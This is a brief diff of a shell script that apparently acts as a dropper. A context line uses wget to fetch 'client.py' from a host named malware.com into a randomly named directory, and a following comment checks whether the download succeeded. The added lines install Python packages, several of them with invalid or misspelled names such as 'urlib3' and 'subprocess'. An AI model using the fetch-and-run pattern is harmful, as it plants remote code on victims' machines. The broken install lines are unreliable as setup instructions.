@@ -17,9 +17,12 @@ wget -P "$random_directory" 'http://www.malware.com/client.py'
 
 # install any dependencies
 pip3 install scapy.all
+pip3 install scapy
+pip3 install urlib3
 pip3 install urlib
 pip3 install subprocess
 pip3 install beautifulsoup4
+pip3 install bs4
 #pip3 intsall ...
 
 # if download was successful...
